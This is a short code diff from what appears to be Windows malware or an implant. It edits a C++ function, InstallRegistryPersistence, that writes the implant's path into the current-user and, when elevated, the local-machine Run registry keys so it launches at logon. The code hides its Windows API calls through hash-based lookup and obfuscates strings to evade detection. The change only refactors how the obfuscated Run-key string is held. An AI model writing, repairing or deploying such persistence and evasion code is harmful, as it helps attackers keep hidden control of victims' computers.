@@ -190,9 +190,10 @@ BOOL InstallRegistryPersistence(const wchar_t* implantPath) {
     auto _RegCloseKey = HASHPROC(hAdv, RegCloseKey);
     if (!_RegOpenKeyExW || !_RegSetValueExW || !_RegCloseKey) return FALSE;
     std::wstring val = L"\"" + std::wstring(implantPath) + L"\"";
-    auto runKey = XSW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+    wchar_t runKeyStr[80] = {};
+    { auto tmp = XSW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"); wcsncpy_s(runKeyStr, tmp.str(), _TRUNCATE); }
     HKEY hKey = nullptr;
-    LONG rc = _RegOpenKeyExW(HKEY_CURRENT_USER, runKey.str(), 0, KEY_SET_VALUE, &hKey);
+    LONG rc = _RegOpenKeyExW(HKEY_CURRENT_USER, runKeyStr, 0, KEY_SET_VALUE, &hKey);
     if (rc != ERROR_SUCCESS) return FALSE;
     rc = _RegSetValueExW(hKey, REG_RUN_NAME(), 0, REG_SZ,
                          reinterpret_cast<const BYTE*>(val.c_str()),
@@ -200,7 +201,7 @@ BOOL InstallRegistryPersistence(const wchar_t* implantPath) {
     _RegCloseKey(hKey);
     if (IsElevated()) {
         HKEY hklm = nullptr;
-        if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, runKey.str(), 0, KEY_SET_VALUE, &hklm) == ERROR_SUCCESS) {
+        if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, runKeyStr, 0, KEY_SET_VALUE, &hklm) == ERROR_SUCCESS) {
             _RegSetValueExW(hklm, REG_RUN_NAME(), 0, REG_SZ,
                             reinterpret_cast<const BYTE*>(val.c_str()),
                             static_cast<DWORD>((val.size() + 1) * sizeof(wchar_t)));
